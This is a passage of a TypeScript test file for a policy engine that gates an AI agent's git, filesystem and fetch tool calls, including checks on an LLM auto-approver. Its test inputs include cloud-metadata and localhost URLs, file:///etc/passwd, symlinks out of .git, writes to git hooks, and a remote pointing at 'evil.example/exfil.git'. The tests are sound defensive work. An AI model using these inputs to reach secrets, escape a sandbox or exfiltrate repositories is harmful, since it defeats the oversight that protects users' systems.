    expect(makeEngine().evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });

  it('escalates a linked reflog file, a dangling link, a linked object directory and a linked COMMIT_EDITMSG', () => {
    const hostFile = join(outside, 'host-rc');
    writeFileSync(hostFile, '# host file\n');
    const linkOut = (name: string, place: (gitDir: string) => string, target: string): void => {
      const repo = initRepo(join(sandbox, name));
      const at = place(join(repo, '.git'));
      rmSync(at, { recursive: true, force: true });
      mkdirSync(dirname(at), { recursive: true });
      symlinkSync(target, at);
      const result = makeEngine().evaluate(request('git', 'git_status', { path: repo }));
      expect(result, name).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
      expect(result.reason, name).not.toContain(target);
    };
    linkOut('reflog-file', (gitDir) => join(gitDir, 'logs', 'refs', 'heads', 'main'), hostFile);
    linkOut('dangling-logs', (gitDir) => join(gitDir, 'logs'), join(outside, 'not-there-yet'));
    mkdirSync(join(outside, 'host-objects'), { recursive: true });
    linkOut('objects-fanout', (gitDir) => join(gitDir, 'objects', 'ab'), join(outside, 'host-objects'));
    linkOut('commit-editmsg', (gitDir) => join(gitDir, 'COMMIT_EDITMSG'), hostFile);
    // `git fetch` with fetch.writeCommitGraph (repository config) rewrites the
    // chain file through the link, replacing the host file's content.
    linkOut(
      'commit-graph-chain',
      (gitDir) => join(gitDir, 'objects', 'info', 'commit-graphs', 'commit-graph-chain'),
      hostFile,
    );
    linkOut('multi-pack-index', (gitDir) => join(gitDir, 'objects', 'pack', 'multi-pack-index'), hostFile);
  });

  it('escalates any symbolic link in the git directory of a repository outside the sandbox', () => {
    const repo = initRepo(join(readable, 'internal-link-outside'));
    const realLogs = join(repo, '.git', 'logs-real');
    renameSync(join(repo, '.git', 'logs'), realLogs);
    symlinkSync(realLogs, join(repo, '.git', 'logs'));
    const result = makeEngine().evaluate(request('git', 'git_status', { path: repo }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('its git directory has a symbolic link');
    expect(inspectRepositoryForPolicy(repo, undefined)).toContain('its git directory has a symbolic link');
  });

  it('escalates a git directory whose walk cannot be finished (a link cycle inside the sandbox)', () => {
    const repo = initRepo(join(sandbox, 'internal-cycle'));
    symlinkSync('..', join(repo, '.git', 'refs', 'heads', 'loop'));
    const result = makeEngine().evaluate(request('git', 'git_status', { path: repo }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('its git directory has too many entries to inspect');
  });

  // The git dir walk examines up to 50,000 entries, so a call naming many
  // paths must not walk the same repository once per path.
  it('inspects a repository once per evaluation, however many of its paths the call names', () => {
    const repo = initRepo(join(sandbox, 'inspect-once'));
    mkdirSync(join(repo, 'sub'), { recursive: true });
    const inspected: RepositoryInspections = new Map();
    expect(inspectRepositoryForPolicy(join(repo, 'a.txt'), sandbox, inspected)).toBeUndefined();
    // Planted after the first path was inspected: the memo answers for the
    // repository's other paths in the same evaluation...
    symlinkSync(outside, join(repo, '.git', 'planted-later'));
    expect(inspectRepositoryForPolicy(join(repo, 'sub', 'b.txt'), sandbox, inspected)).toBeUndefined();
    expect(inspectRepositoryForPolicy(repo, sandbox, inspected)).toBeUndefined();
    expect(inspected.size).toBe(1);
    // ...while each evaluation inspects afresh.
    expect(inspectRepositoryForPolicy(join(repo, 'sub', 'b.txt'), sandbox)).toContain(
      'its git directory has a symbolic link',
    );
    const paths = Array.from({ length: 50 }, (_, i) => join(repo, `f${i}`));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: paths }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });
});

// ---------------------------------------------------------------------------
// No sandbox directory (the list-resolution coordinator): no git in the repo
// ---------------------------------------------------------------------------

describe.skipIf(!gitAvailable || !posix)('without a sandbox directory', () => {
  it('runs no git in an agent-named repository and fails closed on its named remotes', () => {
    // Remote resolution reads repository config only inside the sandbox, and
    // the repository inspection is a static read; with no allowedDirectory
    // nothing runs git anywhere but the trusted-config read from `/`.
    const repo = initRepo(join(readable, 'no-sandbox-remote'));
    git(repo, 'remote', 'add', 'origin', 'https://github.com/acme/private.git');
    const fakeBin = join(root, 'fake-bin');
    const invocations = join(root, 'git-invocations.log');
    mkdirSync(fakeBin, { recursive: true });
    writeFileSync(join(fakeBin, 'git'), `#!/bin/sh\necho "$(pwd -P)|$*" >> '${invocations}'\nexit 1\n`, {
      mode: 0o755,
    });
    const savedPath = process.env.PATH;
    process.env.PATH = [fakeBin, savedPath ?? ''].join(delimiter);
    try {
      const engine = makeEngine({ sandbox: undefined, allowlists: GIT_ALLOWLIST });
      for (const args of [{ path: repo, remote: 'origin' }, { path: repo }]) {
        const result = engine.evaluate(request('git', 'git_fetch', args));
        expect(result).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
        expect(result.reason).toContain('no sandbox directory is configured');
        expect(result.reason).not.toContain('acme');
      }
      engine.evaluate(request('git', 'git_status', { path: repo }));
      engine.evaluate(request('git', 'git_clone', { url: repo, path: join(outside, 'copy') }));
      const lines = existsSync(invocations) ? readFileSync(invocations, 'utf-8').trim().split('\n') : [];
      for (const line of lines) expect(line.startsWith('/|config ')).toBe(true);
    } finally {
      process.env.PATH = savedPath;
    }
  });
});

// ---------------------------------------------------------------------------
// Fetch destinations and the default domain gate
// ---------------------------------------------------------------------------

describe('isLocalOrMetadataHost', () => {
  it('matches local and metadata names and metadata IP literals only', () => {
    for (const host of [
      'localhost',
      'LOCALHOST.',
      'app.localhost',
      'printer.local',
      'svc.internal',
      'host.docker.internal',
      'metadata.google.internal',
      'metadata',
      '169.254.169.254',
      '[fd00:ec2::254]',
      '100.100.100.200',
    ]) {
      expect(isLocalOrMetadataHost(host), host).toBe(true);
    }
    for (const host of [
      'example.com',
      'github.com',
      '127.0.0.1',
      '[::1]',
      '10.0.0.1',
      'internal.example.com',
      'localhost.example.com',
    ]) {
      expect(isLocalOrMetadataHost(host), host).toBe(false);
    }
  });
});

describe('fetch destinations', () => {
  it('denies local and cloud-metadata hosts even with a permissive compiled rule', () => {
    for (const url of [
      'http://localhost/',
      'http://localhost:7400/admin',
      'http://app.localhost/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://metadata/computeMetadata/v1/',
      'http://printer.local/',
      'http://vault.internal/secrets',
      'http://169.254.169.254/latest/meta-data/',
      'http://[fd00:ec2::254]/latest/meta-data/',
    ]) {
      const result = makeEngine().evaluate(request('fetch', 'http_fetch', { url }));
      expect(result, url).toEqual(LOCAL_DESTINATION_DENY_RESULT);
    }
  });

  it('denies them whatever the server allowlist says', () => {
    const engine = makeEngine({ allowlists: new Map([['fetch', ['*', 'localhost', 'metadata.google.internal']]]) });
    expect(engine.evaluate(request('fetch', 'http_fetch', { url: 'http://localhost/' }))).toEqual(
      LOCAL_DESTINATION_DENY_RESULT,
    );
    expect(engine.evaluate(request('fetch', 'http_fetch', { url: 'http://metadata.google.internal/' }))).toEqual(
      LOCAL_DESTINATION_DENY_RESULT,
    );
  });

  it('gates a server without an allowlist with the default wildcard: names pass, IP literals escalate', () => {
    expect(makeEngine().evaluate(request('fetch', 'http_fetch', { url: 'https://example.com/page' }))).toMatchObject({
      decision: 'allow',
      rule: 'allow-fetch-any',
    });
    for (const url of ['http://127.0.0.1:7400/', 'http://[::1]/api', 'http://10.0.0.1/', 'http://2130706433/']) {
      const result = makeEngine().evaluate(request('fetch', 'http_fetch', { url }));
      expect(result, url).toMatchObject({
        decision: 'escalate',
        rule: 'structural-domain-escalate',
        escalatedRoles: ['fetch-url'],
      });
    }
  });

  it('treats a non-http(s) or hostless URL as unverifiable', () => {
    for (const url of ['file:///etc/passwd', 'localhost:8080/x', 'not a url']) {
      const result = makeEngine().evaluate(request('fetch', 'http_fetch', { url }));
      expect(result, url).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
      expect(result.reason, url).toContain('Cannot verify');
    }
  });
});

// ---------------------------------------------------------------------------
// Acceptance: the shipped compiled policy, annotations and domain allowlists
// ---------------------------------------------------------------------------

describe.skipIf(!gitAvailable || !posix)('with the shipped policy, annotations and allowlists', () => {
  const configDir = resolve(dirname(fileURLToPath(import.meta.url)), '../src/config');
  const readJson = (path: string): unknown => JSON.parse(readFileSync(resolve(configDir, path), 'utf-8'));

  function shippedEngine(): PolicyEngine {
    return new PolicyEngine(
      readJson('generated/compiled-policy.json') as CompiledPolicyFile,
      readJson('generated/tool-annotations.json') as StoredToolAnnotationsFile,
      [icHome, join(homedir(), '.ironcurtain')],
      sandbox,
      extractServerDomainAllowlists(readJson('mcp-servers.json') as Record<string, MCPServerConfig>),
      readJson('generated/dynamic-lists.json') as DynamicListsFile,
    );
  }

  it('evaluates file://github.com/<path> and bare-path clone sources as reads and denies protected ones', () => {
    const engine = shippedEngine();
    const dest = join(sandbox, 'dest');
    for (const url of [
      `file://github.com${join(icHome, 'sessions', 'other', 'sandbox', 'repo')}`,
      join(icHome, 'sessions', 'other', 'sandbox', 'repo'),
    ]) {
      expect(engine.evaluate(request('git', 'git_clone', { url, path: dest })), url).toMatchObject({
        decision: 'deny',
        rule: 'structural-protected-path',
      });
    }
    for (const url of ['/home/u/secret-repo', `file://github.com${secretRepo}`]) {
      const result = engine.evaluate(request('git', 'git_clone', { url, path: dest }));
      expect(result, url).toMatchObject({ decision: 'escalate', rule: 'escalate-git-clone' });
      expect(result.escalatedRoles, url).toContain('read-path');
      expect(result.reason, url).not.toContain('URL domain');
    }
  });

  it('escalates write_file to <sandbox>/repo/.git/config', () => {
    const result = shippedEngine().evaluate(
      request('filesystem', 'write_file', { path: join(sandbox, 'repo', '.git', 'config'), content: '[core]\n' }),
    );
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
  });

  it('escalates git_status on a repository whose gitfile points outside the sandbox', () => {
    initRepo(secretRepo);
    const redirected = join(sandbox, 'shipped-redirected');
    mkdirSync(redirected, { recursive: true });
    writeFileSync(join(redirected, '.git'), `gitdir: ${join(secretRepo, '.git')}\n`);
    expect(shippedEngine().evaluate(request('git', 'git_status', { path: redirected }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });

  it('denies http_fetch of http://localhost/ and http://metadata.google.internal/', () => {
    const engine = shippedEngine();
    for (const url of ['http://localhost/', 'http://metadata.google.internal/computeMetadata/v1/']) {
      expect(engine.evaluate(request('fetch', 'http_fetch', { url })), url).toEqual(LOCAL_DESTINATION_DENY_RESULT);
    }
  });
});

// ---------------------------------------------------------------------------
// Pipeline: structural git escalations are approved call by call
// ---------------------------------------------------------------------------

describe('pipeline never whitelists the structural git escalations', () => {
  interface Harness {
    readonly deps: CallToolDeps;
    readonly onEscalation: Mock<InProcessEscalationFn>;
  }

  function harness(): Harness {
    const callTool = vi.fn().mockResolvedValue({ content: [{ type: 'text', text: 'ok' }] });
    const state: ClientState = { client: undefined as unknown as ClientState['client'], roots: [] };
    state.client = {
      callTool,
      sendRootsListChanged: vi.fn(() => Promise.resolve()),
    } as unknown as ClientState['client'];
    const onEscalation = vi.fn<InProcessEscalationFn>(() =>
      Promise.resolve({ decision: 'approved', whitelistSelection: 0 }),
    );
    const toolMap = new Map<string, ProxiedTool>(
      annotations.servers.filesystem.tools.map((t) => [
        t.toolName,
        { serverName: 'filesystem', name: t.toolName, inputSchema: { type: 'object' } },
      ]),
    );
    const deps: CallToolDeps = {
      toolMap,
      policyEngine: makeEngine(),
      auditLog: { log: vi.fn(), assertWritable: vi.fn() } as unknown as CallToolDeps['auditLog'],
      circuitBreaker: {
        check: vi.fn().mockReturnValue({ allowed: true }),
      } as unknown as CallToolDeps['circuitBreaker'],
      clientStates: new Map<string, ClientState>([['filesystem', state]]),
      resolvedSandboxConfigs: new Map<string, ResolvedSandboxConfig>([
        ['filesystem', { sandboxed: false, reason: 'opt-out' }],
      ]),
      allowedDirectory: sandbox,
      escalationDir: undefined,
      autoApproveModel: null,
      serverContextMap: new Map(),
      whitelist: createApprovalWhitelist(),
      onEscalation,
    };
    return { deps, onEscalation };
  }

  it('offers no whitelist candidate for a .git write and escalates the next identical call again', async () => {
    const { deps, onEscalation } = harness();
    const args = { path: join(sandbox, 'repo', '.git', 'config'), content: '[core]\n' };

    const first = await handleCallTool('write_file', args, deps);
    expect(first._policyDecision).toMatchObject({ status: 'allow', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
    expect(onEscalation).toHaveBeenCalledTimes(1);
    expect(onEscalation.mock.calls[0][3]).toBeUndefined();
    expect(deps.whitelist.size).toBe(0);

    await handleCallTool('write_file', args, deps);
    expect(onEscalation).toHaveBeenCalledTimes(2);
  });

  it('ignores a pattern that would otherwise cover the .git write', async () => {
    const { deps, onEscalation } = harness();
    deps.whitelist.add({
      serverName: 'filesystem',
      toolName: 'write_file',
      constraints: [{ kind: 'directory', role: 'write-path', directory: join(sandbox, 'repo', '.git') }],
      createdAt: new Date().toISOString(),
      sourceEscalationId: 'e1',
      originalReason: 'test',
      description: 'writes inside .git',
    });
    await handleCallTool(
      'write_file',
      { path: join(sandbox, 'repo', '.git', 'hooks', 'pre-commit'), content: '#!/bin/sh\n' },
      deps,
    );
    expect(onEscalation).toHaveBeenCalledTimes(1);
  });

  it('still offers candidates for an ordinary compiled escalation', async () => {
    const { deps, onEscalation } = harness();
    await handleCallTool('write_file', { path: join(outside, 'notes', 'todo.txt'), content: 'x' }, deps);
    expect(onEscalation).toHaveBeenCalledTimes(1);
    expect(onEscalation.mock.calls[0][3]).toBeDefined();
    expect(deps.whitelist.size).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Pipeline: the auto-approver anchors what the structural git rules escalate
// ---------------------------------------------------------------------------

describe.skipIf(!gitAvailable || !posix)('auto-approver input for structural git escalations', () => {
  /** An approver model that always approves and records the TOOL_CALL block of every prompt it is shown. */
  function approvingModel(): { model: LanguageModelV3; calls: Record<string, unknown>[] } {
    const calls: Record<string, unknown>[] = [];
    const model = new MockLanguageModelV3({
      doGenerate: async ({ prompt }) => {
        let text = '';
        for (const message of prompt) {
          if (message.role !== 'user' || !Array.isArray(message.content)) continue;
          for (const part of message.content) if ('text' in part) text += part.text;
        }
        const start = text.indexOf('<<<TOOL_CALL\n') + '<<<TOOL_CALL\n'.length;
        calls.push(JSON.parse(text.slice(start, text.indexOf('\nTOOL_CALL>>>'))) as Record<string, unknown>);
        return {
          content: [{ type: 'text' as const, text: JSON.stringify({ decision: 'approve', reasoning: 'mock' }) }],
          finishReason: { unified: 'stop' as const, raw: 'stop' },
          usage: {
            inputTokens: { total: 50, noCache: undefined, cacheRead: undefined, cacheWrite: undefined },
            outputTokens: { total: 20, text: undefined, reasoning: undefined },
          },
          warnings: [],
          request: {},
          response: { id: 'test-id', modelId: 'test-model', timestamp: new Date() },
        };
      },
    }) as unknown as LanguageModelV3;
    return { model, calls };
  }

  function harness(userMessage: string): {
    deps: CallToolDeps;
    calls: Record<string, unknown>[];
    onEscalation: Mock<InProcessEscalationFn>;
  } {
    const { model, calls } = approvingModel();
    const state: ClientState = {
      client: {
        callTool: vi.fn().mockResolvedValue({ content: [{ type: 'text', text: 'ok' }] }),
        sendRootsListChanged: vi.fn(() => Promise.resolve()),
      } as unknown as ClientState['client'],
      roots: [],
    };
    const onEscalation = vi.fn<InProcessEscalationFn>(() => Promise.resolve({ decision: 'denied' }));
    const deps: CallToolDeps = {
      toolMap: new Map<string, ProxiedTool>(
        annotations.servers.git.tools.map((t) => [
          t.toolName,
          { serverName: 'git', name: t.toolName, inputSchema: { type: 'object' } },
        ]),
      ),
      policyEngine: makeEngine({ allowlists: GIT_ALLOWLIST }),
      auditLog: { log: vi.fn(), assertWritable: vi.fn() } as unknown as CallToolDeps['auditLog'],
      circuitBreaker: {
        check: vi.fn().mockReturnValue({ allowed: true }),
      } as unknown as CallToolDeps['circuitBreaker'],
      clientStates: new Map<string, ClientState>([['git', state]]),
      resolvedSandboxConfigs: new Map(),
      allowedDirectory: sandbox,
      escalationDir: undefined,
      autoApproveModel: model,
      autoApproveUserMessage: userMessage,
      serverContextMap: new Map(),
      whitelist: createApprovalWhitelist(),
      onEscalation,
    };
    return { deps, calls, onEscalation };
  }

  const syntheticSource = `url${LOCAL_GIT_SOURCE_ARG_SUFFIX}`;

  it('requires the human to name a local clone source the engine escalated as a read', async () => {
    // The compiled rules allow the clone's URL role and the destination is
    // sandbox-resolved: the only escalated role is the read of the source,
    // which no argument the agent passed carries.
    const source = join(outside, 'approver-source');
    mkdirSync(source, { recursive: true });
    const dest = join(sandbox, 'dest');

    const vague = harness(`clone the repository into ${dest}`);
    const denied = await handleCallTool('git_clone', { url: source, path: dest }, vague.deps);
    expect(denied._policyDecision).toMatchObject({ status: 'deny', rule: 'escalate-git-reads' });
    expect(vague.calls).toHaveLength(0);
    expect(vague.onEscalation).toHaveBeenCalledTimes(1);

    const named = harness(`clone ${source} into ${dest}`);
    const approved = await handleCallTool('git_clone', { url: source, path: dest }, named.deps);
    expect(approved._policyDecision).toMatchObject({ status: 'allow', rule: 'escalate-git-reads' });
    expect(named.onEscalation).not.toHaveBeenCalled();
    expect(named.calls).toHaveLength(1);
    expect((named.calls[0].arguments as Record<string, unknown>)[syntheticSource]).toEqual({
      kind: 'path',
      values: [source],
      escalated: true,
    });
  });

  it('anchors a local clone source by its canonical path, not by a sandbox symlink to it', async () => {
    const source = join(outside, 'approver-linked-source');
    mkdirSync(source, { recursive: true });
    const link = join(sandbox, 'approver-source-link');
    if (!existsSync(link)) symlinkSync(source, link);
    const dest = join(sandbox, 'dest');

    const { deps, calls, onEscalation } = harness(`clone ${link} into ${dest}`);
    const result = await handleCallTool('git_clone', { url: link, path: dest }, deps);
    expect(result._policyDecision).toMatchObject({ status: 'deny', rule: 'escalate-git-reads' });
    expect(calls).toHaveLength(0);
    expect(onEscalation).toHaveBeenCalledTimes(1);
  });

  it('never lets a remote name anchor a destination the domain gate escalated under a repository escalation', async () => {
    // Both escalate: origin points off the allowlist (the domain gate) and the
    // repository defines a driver (named in its place). "fetch origin" must
    // not cover wherever origin now points, as with the gate alone.
    const repo = initRepo(join(sandbox, 'approver-gated'));
    git(repo, 'remote', 'add', 'origin', 'https://evil.example/exfil.git');
    git(repo, 'config', 'filter.x.clean', 'cat');

    const vague = harness(`fetch origin in ${repo}`);
    const denied = await handleCallTool('git_fetch', { path: repo, remote: 'origin' }, vague.deps);
    expect(denied._policyDecision).toMatchObject({ status: 'deny', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(vague.calls).toHaveLength(0);
    expect(vague.onEscalation).toHaveBeenCalledTimes(1);

    const named = harness(`fetch from evil.example in ${repo}`);
    await handleCallTool('git_fetch', { path: repo, remote: 'origin' }, named.deps);
    expect(named.calls).toHaveLength(1);
    expect(named.calls[0].rule).toBe(STRUCTURAL_GIT_REPOSITORY_ESCALATE);
    expect((named.calls[0].arguments as Record<string, unknown>).remote).toEqual({
      kind: 'destination',
      remote: 'origin',
      hosts: ['evil.example'],
      verified: true,
      escalated: true,
    });
  });
});
